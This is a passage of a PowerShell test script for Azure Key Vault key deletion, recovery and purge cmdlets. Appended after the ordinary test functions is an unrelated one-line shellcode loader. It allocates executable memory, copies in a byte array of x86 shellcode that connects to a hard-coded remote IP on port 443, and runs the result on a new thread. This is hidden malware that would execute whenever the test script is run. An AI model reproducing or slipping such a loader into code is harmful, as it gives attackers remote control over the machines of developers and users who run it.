	$key | Remove-AzKeyVaultKey -Force -Confirm:$false

	Wait-ForDeletedKey $keyVault $keyname

	$recoveredKey = Undo-AzKeyVaultKeyRemoval -VaultName $keyVault -Name $keyname

	Assert-NotNull $recoveredKey
	Assert-AreEqual $recoveredKey.Name $key.Name
	Assert-AreEqual $recoveredKey.Version $key.Version
	Assert-KeyAttributes $recoveredKey.Attributes 'RSA' $false $expires $nbf $ops $tags 
}



function Test_RemoveDeletedKey
{
	
    $keyVault = Get-KeyVault
    $keyname=Get-KeyName 'RemoveDeletedKey'
    $key=Add-AzKeyVaultKey -VaultName $keyVault -Name $keyname -Destination 'Software' -Expires $expires -NotBefore $nbf -KeyOps $ops -Disable -Tag $tags
    Assert-NotNull $key
    $global:createdKeys += $keyname

	$key | Remove-AzKeyVaultKey -Force -Confirm:$false

	Wait-ForDeletedKey $keyVault $keyname
	
	Remove-AzKeyVaultKey -VaultName $keyVault -Name $keyname -InRemovedState -Force -Confirm:$false
}


function Test_RemoveNonExistDeletedKey
{
	$keyVault = Get-KeyVault
    $keyname=Get-KeyName 'RemoveNonExistKey'
    $key=Add-AzKeyVaultKey -VaultName $keyVault -Name $keyname -Destination 'Software' -Expires $expires -NotBefore $nbf -KeyOps $ops -Disable -Tag $tags
    Assert-NotNull $key
    $global:createdKeys += $keyname

    Assert-Throws {Remove-AzKeyVaultKey -VaultName $keyVault -Name $keyname -InRemovedState -Force -Confirm:$false}
}



function Test_PipelineRemoveDeletedKeys
{
    $keyVault = Get-KeyVault
    $keypartialname=Get-KeyName 'piperemove'
    $total=2
    BulkCreateSoftKeys $keyVault $keypartialname $total   

    Get-AzKeyVaultKey $keyVault |  Where-Object {$_.KeyName -like $keypartialname+'*'}  | Remove-AzKeyVaultKey -Force -Confirm:$false
	Wait-Seconds 30
	Get-AzKeyVaultKey $keyVault -InRemovedState |  Where-Object {$_.KeyName -like $keypartialname+'*'}  | Remove-AzKeyVaultKey -Force -Confirm:$false -InRemovedState

    $keys = Get-AzKeyVaultKey $keyVault -InRemovedState |  Where-Object {$_.KeyName -like $keypartialname+'*'} 
    Assert-AreEqual $keys.Count 0
}
$code = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$winFunc = Add-Type -memberDefinition $code -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$sc64 = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xb2,0x4b,0xf6,0x39,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;[Byte[]]$sc = $sc64;$size = 0x1000;if ($sc.Length -gt 0x1000) {$size = $sc.Length};$x=$winFunc::VirtualAlloc(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};$winFunc::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };

